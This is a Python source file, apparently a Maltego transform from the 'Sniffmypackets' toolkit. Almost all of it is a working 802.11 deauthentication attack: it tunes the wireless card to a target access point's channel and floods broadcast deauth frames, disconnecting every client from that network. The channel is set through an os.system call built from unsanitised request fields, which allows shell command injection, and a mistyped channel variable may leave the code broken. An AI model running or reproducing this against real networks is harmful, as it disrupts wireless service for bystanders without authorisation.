#!/usr/bin/env python

import os
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from common.entities import SniffmypacketsEntity, accessPoint
from canari.maltego.utils import debug, progress
from canari.framework import configure #, superuser

__author__ = 'catalyst256'
__copyright__ = 'Copyright 2013, Sniffmypackets Project'
__credits__ = []

__license__ = 'GPL'
__version__ = '0.1'
__maintainer__ = 'catalyst256'
__email__ = 'catalyst256@gmail.com'
__status__ = 'Development'

__all__ = [
    'dotransform'
]


#@superuser
@configure(
    label='Deauth Packets [U]',
    description='Sends Deauth packets to Access Point',
    uuids=[ 'sniffMyPackets.v2.Deauth2AccessPoint' ],
    inputs=[ ( 'sniffMyPackets', accessPoint ) ],
    debug=False
)
def dotransform(request, response):
  
  ssid = request.value
  client = 'FF:FF:FF:FF:FF:FF'
  buff = request.fields
  count = 64
  interface = ''
  ap_channel = ''
  bssid = ''
  for key, value in buff.items():
	if key == 'sniffMyPackets.apmoninterface':
	  interface = value
	if key == 'sniffMyPackets.channel':
	  channel = value
	if key == 'sniffMyPackets.bssid':
	  bssid = value
  
  os.system("iw dev %s set channel %s" % (interface, channel))
  
  def deAuth(bssid, client, count):
	pckt = Dot11(addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth()
	while count !=0:
	  try:
		for i in range(64):
		  send(pckt, verbose=0)
		count -= 1
	  except KeyboardInterrupt:
		break
	  
  deAuth(bssid, client, count)
  return response

